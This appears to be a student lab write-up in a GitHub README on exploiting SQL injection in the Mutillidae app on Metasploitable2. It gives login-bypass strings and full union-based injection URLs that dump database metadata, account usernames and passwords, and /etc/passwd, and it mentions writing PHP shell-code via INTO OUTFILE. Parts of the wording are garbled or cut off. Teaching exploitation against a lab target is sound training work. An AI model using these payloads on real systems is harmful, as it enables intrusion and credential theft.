# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### Note
```bash
Change Your IP Where the <192.168.43.145> Enter Your IP Addr
```

## EXECUTION STEPS AND ITS OUTPUT:
- SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.

- Identify IP address using ifconfig in Metasploitable2
<img width="1035" height="516" alt="image" src="https://github.com/user-attachments/assets/434fa9bd-81b2-4c4d-b286-9c1e61befbe7" />




- Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
<img width="1037" height="552" alt="image" src="https://github.com/user-attachments/assets/0f0def9b-7824-4281-9908-e25b9f8218ad" />



- Select Multidae from the menu listed as shown above. You will get the page as displayed below:

<img width="1040" height="489" alt="image" src="https://github.com/user-attachments/assets/3614271f-375c-4293-9bda-9ff49683aff7" />


- Click on the menu Login/Register and register for an account
<img width="1043" height="476" alt="image" src="https://github.com/user-attachments/assets/c94d49a5-e3c2-438d-8f7c-0c4e923ff1b7" />


- Click on the link “Please register here”

<img width="1041" height="486" alt="image" src="https://github.com/user-attachments/assets/348c3707-59d1-45cc-9a5b-0351613c143d" />

- Click on “Create Account” to display the following page:

<img width="1033" height="436" alt="image" src="https://github.com/user-attachments/assets/6a61270f-fade-46bf-9772-0cf30722ecd9" />


- The login structure we will use in our examples is straightforward. 

- It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:
- 
```
($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
```

- For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
<img width="1036" height="490" alt="image" src="https://github.com/user-attachments/assets/d07b05ee-a0fa-4940-8e7e-d6e8b232d74b" />



- Click “Login”. The logged in page will show as below:

<img width="1041" height="754" alt="image" src="https://github.com/user-attachments/assets/14ce8aa7-b865-4d5b-b334-9220c48fd7af" />



## Bypassing login field
- The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

- Now after logging out you will see the login page. In the login page give ganesh’ # .

- You can see the page now enters into the administrator page as before when giving the password.

<img width="1033" height="486" alt="image" src="https://github.com/user-attachments/assets/967e1335-28a2-48fc-b4b5-481b5332f208" />


- Click the login button and you will see it enter into the administrator page.
<img width="1038" height="480" alt="image" src="https://github.com/user-attachments/assets/428dda2f-a3cf-4488-9a5e-35cfec3b9cfe" />



## Union-based SQL injection
- UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

- After logging out, Now choose the menu as shown below:
<img width="1038" height="344" alt="image" src="https://github.com/user-attachments/assets/2cfe8719-7bc6-473e-b3b8-6e8622c0f096" />

<img width="1041" height="487" alt="image" src="https://github.com/user-attachments/assets/cf314e57-b1c7-4580-a5af-f7be2ad7438f" />


<img width="1040" height="497" alt="image" src="https://github.com/user-attachments/assets/9357b90d-0bf7-4c69-8edc-281e89884e3a" />






- From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.




- Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

- The browser url of this info page need to be modified with the url as below:
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
```
<img width="1038" height="502" alt="image" src="https://github.com/user-attachments/assets/439748e4-6071-4da5-9197-1567dc047cc0" />


- After adding the order by 6 into the existing url , the following error statement will be obtained:

<img width="1048" height="503" alt="image" src="https://github.com/user-attachments/assets/dfcd5fa0-a0f2-4053-9292-4c044b46fd70" />

- When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
  <img width="1032" height="317" alt="image" src="https://github.com/user-attachments/assets/04b0fd83-a4c7-4741-b49a-2752092cab81" />


- As it is having 5 columns the query worked fine and it provides the correct result
<img width="1042" height="535" alt="image" src="https://github.com/user-attachments/assets/62ae2231-a39d-47c6-a773-e2f8c871e20d" />


- Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union


- As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
<img width="1045" height="584" alt="image" src="https://github.com/user-attachments/assets/685022a2-9409-4ca2-b07c-3be798efe861" />


- Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
```
<img width="1042" height="508" alt="image" src="https://github.com/user-attachments/assets/c23fc8ee-ca15-49c3-b095-b4da807ec3f7" />

- The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

- Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
```
<img width="1044" height="484" alt="image" src="https://github.com/user-attachments/assets/f3878962-5aa1-436e-a940-7ddee067a757" />


- The url once executed will retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
- When the attacker knows table names, he needs to discover what the column names are to extract data.

- In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

- Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

- Here we are trying to extract column names from the “accounts” table.




- The column names of the accounts is displayed below for the following url:
```
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
```

- Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

## Ex: (union select 1,username,password,is_admin,5 from accounts).
```
http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
```

- Reading and writing files on the web-server
- We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

## Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
```
http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
```
<img width="1046" height="486" alt="image" src="https://github.com/user-attachments/assets/4dd73c58-be97-480a-a1d0-824c49a784ef" />

- the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion.

- we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. 

- This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. 

Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:

The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
